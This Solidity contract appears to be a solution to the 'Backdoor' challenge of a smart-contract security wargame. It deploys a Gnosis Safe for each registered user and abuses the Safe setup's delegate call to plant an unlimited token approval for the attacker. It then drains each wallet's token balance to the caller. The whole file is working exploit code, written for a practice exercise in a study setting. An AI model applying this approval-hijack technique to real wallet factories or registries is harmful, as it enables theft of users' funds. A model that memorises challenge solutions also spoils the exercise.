// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./WalletRegistry.sol";

interface IGnosisFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract Attack {
    function approve(address attacker, IERC20 token) public {
        token.approve(attacker, type(uint256).max);
    }
}

contract BackdoorAttacker {
    WalletRegistry private immutable walletRegistry;
    IGnosisFactory private immutable factory;
    GnosisSafe private immutable masterCopy;
    IERC20 private immutable token;
    Attack private immutable attacker;

    constructor(address _walletRegistry, address[] memory users) {
        //create a new safe through the factory
        walletRegistry = WalletRegistry(_walletRegistry);
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        token = IERC20(walletRegistry.token());
        factory = IGnosisFactory(walletRegistry.walletFactory());
        address wallet;
        address[] memory owners = new address[](1);

        bytes memory initializer;

        attacker = new Attack();

        for (uint i = 0; i < users.length; i++) {
            owners[0] = users[i];
            initializer = abi.encodeCall(
                GnosisSafe.setup,
                (
                    owners,
                    1,
                    address(attacker),
                    abi.encodeCall(Attack.approve, (address(this), token)),
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );
            wallet = address(
                factory.createProxyWithCallback(
                    address(masterCopy),
                    initializer,
                    0,
                    IProxyCreationCallback(walletRegistry)
                )
            );
            token.transferFrom(wallet, msg.sender, token.balanceOf(wallet));
        }
    }
}
